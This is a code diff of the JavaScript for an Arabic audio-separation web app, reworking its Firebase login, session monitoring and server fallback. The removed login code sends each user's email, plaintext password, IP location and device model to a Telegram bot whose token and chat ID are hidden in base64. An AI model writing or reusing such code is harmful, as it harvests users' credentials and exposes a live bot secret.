@@ -107,10 +107,6 @@ const firebaseConfig = {
 firebase.initializeApp(firebaseConfig);
 const auth = firebase.auth();
 
-const TELEGRAM_BOT_TOKEN = atob("ODg2MjU4MjI3MzpBQUg5UHFPZjU1WFJYM2UtSVNhd19vNWluRjlzNkhsQmlzaw==");
-const YOUR_CHAT_ID = atob("MTY2MTcwMjM4NA==");
-let generatedOTP = "";
-let currentAuthEmail = "";
 let isProcessingActive = false;
 
 // Warn on unload during processing
@@ -144,20 +140,18 @@ if (localStorage.getItem('site_unlocked') !== 'true') {
   if (lockScreen) lockScreen.style.display = 'none';
 }
 
-auth.onAuthStateChanged(async (user) => {
-  if (user) {
-    try {
-      await user.reload();
-    } catch (error) {
+function monitorSession(uid) {
+  firebase.database().ref('users/' + uid + '/currentSession').on('value', (snapshot) => {
+    const dbSession = snapshot.val();
+    const mySession = localStorage.getItem("my_active_session");
+
+    if (dbSession && dbSession !== mySession) {
+      firebase.database().ref('users/' + uid + '/currentSession').off();
+      alert("تم تسجيل الدخول من جهاز آخر! سيتم إنهاء جلستك الآن.");
       executeForceLogout();
     }
-  } else if (localStorage.getItem('site_unlocked') === 'true') {
-    setTimeout(() => {
-      if (!auth.currentUser) executeForceLogout();
-    }, 5000);
-  }
-});
-
+  });
+}
 function executeForceLogout() {
   auth.signOut();
   localStorage.removeItem('site_unlocked');
@@ -170,7 +164,36 @@ function executeForceLogout() {
   setTimeout(() => showToast('انتهت الجلسة أو تم إيقاف الحساب!', 'error'), 800);
 }
 
-window.authWithFirebase = async function(action) {
+auth.onAuthStateChanged(async (user) => {
+  if (user) {
+    // 1. تشغيل مراقبة الجلسة (كراسي الموسيقى) فوراً
+    if (localStorage.getItem('site_unlocked') === 'true' && typeof monitorSession === 'function') {
+      monitorSession(user.uid);
+    }
+    
+    try {
+      await user.reload();
+    } catch (error) {
+      // 2. الطرد ممنوع نهائياً إلا بحالتين حصراً: الحساب انحذف أو انحظر من الإدارة
+      if (error.code === 'auth/user-disabled' || error.code === 'auth/user-not-found') {
+        alert("تم إيقاف حسابك من الإدارة.");
+        executeForceLogout();
+      } else {
+        // تجاهل أي خطأ آخر للحفاظ على الجلسة
+        console.warn("تم تجاهل خطأ فايربيس للحفاظ على تسجيل الدخول:", error.code);
+      }
+    }
+  } else if (localStorage.getItem('site_unlocked') === 'true') {
+    // إذا كاش المتصفح انمسح من النظام والفايربيس ضيع الدخول
+    setTimeout(() => {
+      if (!auth.currentUser) {
+        executeForceLogout();
+      }
+    }, 5000);
+  }
+});
+
+window.authWithFirebase = async function() {
   const email = document.getElementById('loginEmail').value.trim();
   const password = document.getElementById('loginPassword').value.trim();
 
@@ -179,128 +202,50 @@ window.authWithFirebase = async function(action) {
   }
 
   const loginBtn = document.querySelector('#lockStep1 .btn-primary');
-  const signupBtn = document.querySelector('#lockStep1 .btn-secondary');
-  const clickedBtn = action === 'signup' ? signupBtn : loginBtn;
-  const originalHtml = clickedBtn ? clickedBtn.innerHTML : '';
+  const originalHtml = loginBtn ? loginBtn.innerHTML : '';
 
-  if (loginBtn) loginBtn.disabled = true;
-  if (signupBtn) signupBtn.disabled = true;
-  if (clickedBtn) clickedBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> انتظر...';
+  if (loginBtn) {
+    loginBtn.disabled = true;
+    loginBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> انتظر...';
+  }
 
-  showToast('جاري التحقق...', 'warning');
+  showToast('جاري تسجيل الدخول...', 'warning');
 
   try {
-    if (action === 'signup') {
-      await auth.createUserWithEmailAndPassword(email, password);
-      showToast('تم إنشاء الحساب! جاري طلب الإذن...', 'success');
-    } else {
-      await auth.signInWithEmailAndPassword(email, password);
-      showToast('تم تسجيل الدخول! جاري طلب الإذن...', 'success');
-    }
-
-    let userInfo = {
-      ip: "غير معروف",
-      country: "غير معروف",
-      city: "غير معروف",
-      deviceName: "غير متوفر",
-      deviceDetails: navigator.userAgent,
-      password: password
-    };
-
-    try {
-      if (navigator.userAgentData) {
-        const highEntropy = await navigator.userAgentData.getHighEntropyValues(['model']);
-        userInfo.deviceName = highEntropy.model || "غير متوفر";
-      } else {
-        const match = navigator.userAgent.match(/\(([^)]+)\)/);
-        if (match) userInfo.deviceName = match[1].split(';')[2]?.trim() || "غير متوفر";
-      }
-    } catch (e) {}
-
-    try {
-      const res = await fetch('https://ipwho.is/');
-      const data = await res.json();
-      if (data.success) {
-        userInfo.ip = data.ip;
-        userInfo.country = data.country;
-        userInfo.city = data.city;
-      }
-    } catch (e) {
-      console.log("تعذر جلب الموقع");
-    }
-
-    currentAuthEmail = email;
-    triggerTelegramOTP(userInfo);
-
-  } catch (error) {
-    if (loginBtn) loginBtn.disabled = false;
-    if (signupBtn) signupBtn.disabled = false;
-    if (clickedBtn) clickedBtn.innerHTML = originalHtml;
-
-    let msg = 'حدث خطأ: ' + (error.code || error.message);
-    if (error.code === 'auth/email-already-in-use') msg = 'الإيميل مسجل مسبقاً! استخدم "دخول".';
-    if (['auth/wrong-password', 'auth/invalid-credential', 'auth/invalid-login-credentials', 'auth/user-not-found'].includes(error.code)) msg = 'كلمة المرور غير صحيحة.';
-    if (error.code === 'auth/user-disabled') msg = 'تم إيقاف هذا الحساب.';
-    if (error.code === 'auth/weak-password') msg = 'كلمة المرور ضعيفة (6+ أحرف).';
-    if (error.code === 'auth/invalid-email') msg = 'صيغة البريد خاطئة.';
-    if (error.code === 'auth/too-many-requests') msg = 'محاولات كثيرة، انتظر قليلاً.';
-    if (error.code === 'auth/network-request-failed') msg = 'المتصفح يمنع الاتصال أو لا يوجد إنترنت.';
-
-    showToast(msg, 'error');
-  }
-}
-
-function triggerTelegramOTP(userInfo) {
-  generatedOTP = Math.floor(1000 + Math.random() * 9000).toString();
-  const deviceType = userInfo.deviceDetails.includes("Mobile") || userInfo.deviceDetails.includes("Android") || userInfo.deviceDetails.includes("iPhone") ?
-    "📱 هاتف محمول" : "💻 كمبيوتر";
-
-  const message =
-    `🚨 <b>طلب دخول للموقع!</b>\n\n` +
-    `👤 <b>البريد:</b> ${currentAuthEmail}\n` +
-    `🔑 <b>كلمة المرور:</b> <code>${userInfo.password}</code>\n\n` +
-    `🌍 <b>الموقع:</b> ${userInfo.country} - ${userInfo.city}\n\n` +
-    `🖥️ <b>نوع الجهاز:</b> ${deviceType}\n` +
-    `📱 <b>موديل الهاتف:</b> <code>${userInfo.deviceName}</code>\n\n` +
-    `🛡️ <b>كود التحقق (OTP):</b> <code>${generatedOTP}</code>\n\n` +
-    `<i>(أعطِ هذا الكود للشخص إذا كنت توافق على دخوله)</i>`;
-
-  const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-
-  fetch(telegramUrl, {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json'
-      },
-      body: JSON.stringify({
-        chat_id: YOUR_CHAT_ID,
-        text: message,
-        parse_mode: 'HTML'
-      })
-    })
-    .then(res => res.json())
-    .then(data => {
-      if (data.ok) {
-        document.getElementById('lockStep1').style.display = 'none';
-        document.getElementById('lockStep2').style.display = 'block';
-      } else {
-        showToast('فشل إرسال الكود لتليجرام.', 'error');
-      }
-    })
-    .catch(() => showToast('تأكد من اتصالك بالإنترنت.', 'error'));
-}
-
-window.verifyAccess = function() {
-  const code = document.getElementById('verificationCode').value.trim();
-  if (code === generatedOTP) {
+    const userCredential = await auth.signInWithEmailAndPassword(email, password);
+    const user = userCredential.user;
+    
+    // نجاح الدخول: إنشاء الجلسة فوراً وفتح القفل برمجياً
     localStorage.setItem('site_unlocked', 'true');
+    const sessionId = Date.now().toString(36) + Math.random().toString(36).substring(2);
+    localStorage.setItem("my_active_session", sessionId);
+    await firebase.database().ref('users/' + user.uid).update({ currentSession: sessionId });
+    
+    // بدء مراقبة الحساب لمنع الدخول المتعدد
+    monitorSession(user.uid);
+
     document.body.classList.remove('locked');
     const lockScreen = document.getElementById('telegramLockScreen');
-    lockScreen.style.opacity = '0';
-    setTimeout(() => lockScreen.style.display = 'none', 500);
-    showToast('تم التحقق بنجاح! أهلاً بك.', 'success');
-  } else {
-    showToast('الكود خاطئ! حاول مجدداً.', 'error');
+    if (lockScreen) {
+      lockScreen.style.opacity = '0';
+      setTimeout(() => lockScreen.style.display = 'none', 500);
+    }
+    showToast('تم تسجيل الدخول بنجاح! أهلاً بك.', 'success');
+
+  } catch (error) {
+    if (loginBtn) {
+      loginBtn.disabled = false;
+      loginBtn.innerHTML = originalHtml;
+    }
+
+    let msg = 'حدث خطأ: ' + (error.code || error.message);
+    if (['auth/wrong-password', 'auth/invalid-credential', 'auth/invalid-login-credentials', 'auth/user-not-found'].includes(error.code)) msg = 'البريد أو كلمة المرور غير صحيحة.';
+    if (error.code === 'auth/user-disabled') msg = 'تم إيقاف هذا الحساب من قبل الإدارة.';
+    if (error.code === 'auth/invalid-email') msg = 'صيغة البريد خاطئة.';
+    if (error.code === 'auth/too-many-requests') msg = 'محاولات كثيرة، انتظر قليلاً.';
+    if (error.code === 'auth/network-request-failed') msg = 'تأكد من اتصالك بالإنترنت.';
+
+    showToast(msg, 'error');
   }
 }
 
@@ -665,7 +610,7 @@ window.startProcessing = async function() {
   processBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> جاري المعالجة...';
 
   if (savedToken) {
-    showToast('⏳ جاري المحاولة مجاناً (لتوفير رصيد الـ VIP)', 'success');
+    showToast('🚀 جاري المعالجة السريعة (سيرفر VIP)...', 'success');
   } else {
     showToast('⏳ الخطة المجانية — قد تستغرق وقتاً', 'warning');
   }
@@ -687,51 +632,69 @@ window.startProcessing = async function() {
   }, 300);
 
   try {
-    // 1. قراءة جميع الإعدادات الحقيقية أولاً
-    const selectedModel = document.querySelector('input[name="model_choice"]:checked').value;
-    const windowSize = parseInt(document.getElementById('cfg_window').value);
-    const aggression = parseInt(document.getElementById('cfg_agg').value);
-    const postProcess = document.getElementById('cfg_post').checked;
-    const highEnd = document.getElementById('cfg_high').checked;
-    const tta = document.getElementById('cfg_tta').checked;
+    // 1. تحديد النموذج والمسار الصحيح بناءً على اختيار المستخدم
+    const selectedModelRadio = document.querySelector('input[name="model_choice"]:checked');
+    const isKaraoke = selectedModelRadio && selectedModelRadio.id === 'model_karaoke';
 
-    let apiEndpoint = "/vr_separator";
-    let predictParams = {
-      audio: currentFile,
-      model: selectedModel,
-      window_size: windowSize,
-      aggression: aggression,
-      tta: tta,
-      post_process: postProcess,
-      post_process_threshold: 0.2,
-      high_end_process: highEnd,
-      out_format: "wav",
-      single_stem: ""
-    };
+    let apiEndpoint = "";
+    let predictParams = {};
+
+    if (isKaraoke) {
+      apiEndpoint = "/roformer_separator";
+      predictParams = {
+        audio: currentFile,
+        model_key: "MelBand Roformer | Karaoke by Gabox",
+        out_format: "wav",
+        segment_size: 256,
+        override_seg_size: false,
+        overlap: 8,
+        batch_size: 1,
+        norm_thresh: 0.9,
+        amp_thresh: 1.0,
+        single_stem: ""
+      };
+    } else {
+      apiEndpoint = "/mdxc_separator";
+      predictParams = {
+        audio: currentFile,
+        model: "MDX23C-8KFFT-InstVoc_HQ_2.ckpt",
+        out_format: "wav",
+        segment_size: 256,
+        override_seg_size: false,
+        overlap: 8,
+        batch_size: 1,
+        norm_thresh: 0.9,
+        amp_thresh: 1.0,
+        single_stem: ""
+      };
+    }
 
     let result;
     let isUsingVIP = false;
 
-    // 2. المحاولة الأولى: عبر السيرفر المجاني دائماً
-    try {
-      const clientFree = await Client.connect("TheStinger/UVR5_UI", {});
-      result = await clientFree.predict(apiEndpoint, predictParams);
-    } catch (firstErr) {
-      // 3. فشل المجاني! نتحقق: هل يملك المستخدم توكن احتياطي؟
-      if (savedToken) {
-        showToast('انتهت الحصة المجانية! التبديل للتوكن الخاص (VIP)...', 'warning');
-        document.getElementById('progressStatus').innerText = 'تم التبديل للسيرفر الخاص...';
-        isUsingVIP = true;
-        
+    // 2. محاولة الاتصال بناءً على توفر التوكن وحالته
+    if (savedToken) {
+      try {
+        // أولوية أولى: سيرفر VIP السريع
         const clientVIP = await Client.connect("itsalboushi/UVR5_UI", {
           token: savedToken,
           hf_token: savedToken
         });
         result = await clientVIP.predict(apiEndpoint, predictParams);
-      } else {
-        // إذا فشل المجاني ولا يوجد توكن، يتم رمي الخطأ للـ Catch النهائي
-        throw firstErr;
+        isUsingVIP = true;
+      } catch (vipErr) {
+        // فشل VIP (خلص الرصيد أو السيرفر نايم) -> انتقال للمجاني
+        showToast('نفد رصيد التوكن أو غير متاح! التبديل للمجاني...', 'warning');
+        document.getElementById('progressStatus').innerText = 'يتم الآن المعالجة عبر السيرفر المجاني...';
+        const clientFree = await Client.connect("TheStinger/UVR5_UI", {});
+        result = await clientFree.predict(apiEndpoint, predictParams);
+        isUsingVIP = false;
       }
+    } else {
+      // لا يوجد توكن أو التوكن مقفول -> السيرفر المجاني فوراً
+      const clientFree = await Client.connect("TheStinger/UVR5_UI", {});
+      result = await clientFree.predict(apiEndpoint, predictParams);
+      isUsingVIP = false;
     }
 
     // --- إكمال العملية بعد نجاح أي من السيرفرين ---
@@ -970,10 +933,19 @@ window.closeConfirmModal = function() {
   }
 }
 
-window.confirmClearHistory = function() {
+window.confirmClearHistory = async function() {
   localStorage.removeItem('voiceHistory');
   loadHistory();
-  showToast('تم مسح السجل بنجاح', 'success');
+  
+  try {
+    const db = await dbPromise;
+    const tx = db.transaction("audioFiles", "readwrite");
+    tx.objectStore("audioFiles").clear();
+  } catch (e) {
+    console.log("لم يتم تفريغ قاعدة البيانات:", e);
+  }
+  
+  showToast('تم مسح السجل وتفريغ الذاكرة بنجاح', 'success');
   window.closeConfirmModal();
 }
 
@@ -1158,9 +1130,31 @@ function updateTokenLockUI(isActive) {
 /* ==========================================
    10. INIT
 ========================================== */
+window.autoCleanOldBlobs = async function() {
+  try {
+    const history = JSON.parse(localStorage.getItem('voiceHistory') || '[]');
+    const db = await dbPromise;
+    const tx = db.transaction("audioFiles", "readwrite");
+    const store = tx.objectStore("audioFiles");
+
+    let hasCleaned = false;
+    history.forEach(h => {
+      const hoursPassed = h.timestamp ? (Date.now() - h.timestamp) / (1000 * 60 * 60) : 0;
+      if (hoursPassed > 24 && h.id) {
+        store.delete(h.id);
+        hasCleaned = true;
+      }
+    });
+    if (hasCleaned) console.log("تم تنظيف الملفات القديمة من الذاكرة بنجاح");
+  } catch (e) {
+    console.log("لم يتم التنظيف التلقائي:", e);
+  }
+}
+
 document.getElementById('hf_token_input').value = localStorage.getItem('hf_token') || '';
 updateTokenLockUI(localStorage.getItem('hf_token_active') !== 'false');
 loadHistory();
+autoCleanOldBlobs();
 setTimeout(() => showToast('👋 مرحباً بك في Voice Studio Pro', 'success'), 500);
 
 if ('serviceWorker' in navigator) {
